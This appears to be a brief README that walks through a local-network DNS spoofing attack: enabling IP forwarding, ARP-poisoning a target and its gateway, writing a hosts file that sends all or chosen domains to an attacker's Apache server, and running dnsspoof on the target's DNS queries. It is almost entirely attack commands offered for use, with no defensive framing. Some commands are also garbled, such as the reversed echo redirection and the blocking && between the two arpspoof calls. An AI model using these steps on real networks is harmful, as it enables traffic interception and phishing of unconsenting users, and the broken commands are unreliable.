# DNSPOOF-


Dns spoof =============


1 forward ip 

echo > 1 /proc/sys/net/ipv4/ip_forward



2 arp spoof the target with the getway


arpspoof -t 192.168.1.36 192.168.1.1 && arpspoof -t 192.168.1.1 192.168.1.36


3  create a spoofhost txt file and 
Eg : nano spoofhosts.txt
write redirections eg"

ip bellow is apache ip
192.168.1.33 www*
192.168.1.33 bacon.com
192.168.1.33 *com
192.168.1.33   *

4 start apache2 
service apache2 start


5 activate dns 

dnsspoof -f spoofhosts.txt host 192.168.1.36 and udp port 53
